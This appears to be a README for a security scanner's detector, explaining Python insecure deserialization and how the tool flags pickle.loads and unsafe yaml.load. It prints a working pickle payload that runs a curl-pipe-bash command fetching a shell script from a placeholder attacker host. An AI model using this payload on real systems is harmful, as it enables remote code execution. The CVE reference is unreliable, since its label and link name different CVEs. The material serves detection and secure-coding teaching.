# Insecure Deserialization

## What Is This? (Plain English)

Think of serialization like packing a suitcase: you put your belongings in, someone unpacks them later. Insecure deserialization is like a hotel that unpacks your bag and runs whatever is inside it — including a bomb. Python's `pickle` module deserializes arbitrary Python objects, including ones designed to execute shell commands the moment they're unpacked. An attacker can send a crafted payload that gives them full control of your server.

## What Does the Attack Look Like?

An attacker crafts a pickle payload:
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Sends payload to the restore_session tool
```
The moment your server calls `pickle.loads(payload)`, the shell command runs with the server's privileges.

## The Technical Detail

Python's `pickle` module reconstructs arbitrary Python objects using `__reduce__` hooks. An attacker-controlled payload can define `__reduce__` to return any callable — including `os.system`, `subprocess.Popen`, or `eval` — with attacker-chosen arguments. This executes immediately upon deserialization. `yaml.load` with `yaml.Loader` (not `yaml.safe_load`) supports `!!python/object/apply:` tags with the same effect. This is a remote code execution (RCE) vulnerability with trivial exploitation.

## Vulnerable Code

See [`vulnerable.py`](vulnerable.py)

## Safe Code

See [`safe.py`](safe.py)

## How MCP Sentinel Detects This

The `InsecureDeserializationDetector` flags `pickle.loads()`, `yaml.load()` with `Loader=yaml.Loader`, and `marshal.loads()` called with external data, emitting `INSECURE_DESERIALIZATION` at CRITICAL severity.

## Official References

- **OWASP**: [OWASP A08:2021 — Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- **OWASP**: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- **CISA**: [CISA Alert on Insecure Deserialization](https://www.cisa.gov/uscert/ncas/alerts/TA17-293A)
- **CWE**: [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- **NVD**: [CVE-2019-20907 — Python pickle RCE](https://nvd.nist.gov/vuln/detail/CVE-2011-2597)
